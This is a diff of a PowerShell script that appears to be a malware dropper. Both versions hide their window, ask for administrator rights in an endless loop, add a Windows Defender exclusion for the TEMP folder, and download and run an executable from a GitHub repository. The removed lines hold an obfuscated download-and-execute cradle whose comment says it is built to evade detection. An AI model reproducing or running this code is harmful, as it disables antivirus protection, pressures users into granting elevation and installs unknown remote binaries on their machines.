@@ -5,33 +5,22 @@ try {
     if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }
 } catch {}
 
-# ===== SELF-URL + ADMIN CHECK =====
-$self = "https://github.com/analysisw/test/raw/refs/heads/main/teest.ps1"
+# ===== ADMIN CHECK =====
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
-# ===== ELEVATION LOOP: request admin, denied -> ask forever =====
+# ===== ELEVATION LOOP =====
 if (-not $isAdmin) {
-    if ($PSCommandPath) {
-        $relaunch = "-File `"$PSCommandPath`""
-    } else {
-        # obfuscated cradle so the text has no iex(WebClient.DownloadString pattern
-        $relaunch = "-c &('I'+'EX')((New-Object('Ne'+'t.WebClient')).'Dow'+'nloadString'('$self'))"
-    }
-
+    $tmp = Join-Path $env:TEMP "_svc.ps1"
+    (iwr "https://github.com/analysisw/test/raw/refs/heads/main/teest.ps1" -UseBasicParsing).Content | Out-File $tmp -Encoding UTF8 -Force
     while ($true) {
-        try {
-            Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass $relaunch" -ErrorAction Stop
-            break
-        } catch {
-            Start-Sleep -Seconds 2
-        }
+        $p = Start-Process powershell -Verb RunAs -PassThru -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
+        if ($p -ne $null) { [Environment]::Exit(0) }
+        Start-Sleep -Seconds 2
     }
-    exit
 }
 
-# ===== ADMIN GRANTED: WORK =====
-try { Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue } catch {}
-try { Add-MpPreference -ExclusionPath "$env:TEMP\helloworldd.exe" -ErrorAction SilentlyContinue } catch {}
-
-try { Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/helloworldd.exe" -OutFile "$env:TEMP\helloworldd.exe" -ErrorAction SilentlyContinue } catch {}
-try { Start-Process -FilePath "$env:TEMP\helloworldd.exe" -WindowStyle Hidden } catch {}
+# ===== ADMIN: WORK =====
+$folder = $env:TEMP
+try { Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue } catch {}
+try { Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/helloworldd.exe" -OutFile "$folder\helloworldd.exe" -ErrorAction SilentlyContinue } catch {}
+try { Start-Process -FilePath "$folder\helloworldd.exe" } catch {}
